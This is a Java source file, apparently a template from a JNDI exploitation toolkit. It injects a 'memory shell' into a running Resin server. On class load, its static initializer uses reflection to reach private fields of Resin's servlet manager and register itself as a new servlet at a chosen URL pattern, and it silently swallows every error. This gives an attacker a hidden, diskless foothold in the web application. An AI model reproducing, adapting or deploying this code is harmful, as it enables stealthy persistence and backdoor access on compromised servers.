package com.qi4l.jndi.template.memshell.resin;

import com.caucho.server.dispatch.ServletConfigImpl;
import com.caucho.server.dispatch.ServletManager;

import javax.servlet.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashMap;

public class RSMSFromThreadS implements Servlet {
    public static String pattern;

    public static String NAME;

    static {
        try {
            Class si = Thread.currentThread().getContextClassLoader().loadClass("com.caucho.server.dispatch.ServletInvocation");
            Method                       getContextRequest = si.getMethod("getContextRequest");
            javax.servlet.ServletRequest contextRequest    = (javax.servlet.ServletRequest) getContextRequest.invoke(null);

            Method getServletContext = javax.servlet.ServletRequest.class.getMethod("getServletContext");
            Object web               = getServletContext.invoke(contextRequest);

            com.caucho.server.webapp.WebApp web1 = (com.caucho.server.webapp.WebApp) web;

            com.caucho.server.dispatch.ServletMapping smapping = new com.caucho.server.dispatch.ServletMapping();

            Field f = ServletConfigImpl.class.getDeclaredField("_servletClass");
            f.setAccessible(true);
            f.set(smapping, RSMSFromThreadS.class);

            Field f1 = ServletConfigImpl.class.getDeclaredField("_servletClassName");
            f1.setAccessible(true);
            f1.set(smapping, RSMSFromThreadS.class.getName());

            Field f2 = web1.getClass().getDeclaredField("_servletManager");
            f2.setAccessible(true);

            Object manager = f2.get(web1);
            Field  f3      = ServletManager.class.getDeclaredField("_servlets");
            f3.setAccessible(true);
            HashMap map = (HashMap) f3.get(manager);

            map.put(NAME, new ServletConfigImpl());

            smapping.setServletName(NAME);
            smapping.addURLPattern(pattern);

            web1.addServletMapping(smapping);
        } catch (Exception ignored) {
        }
    }

    @Override
    public void init(ServletConfig servletConfig) throws ServletException {
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {
    }
}
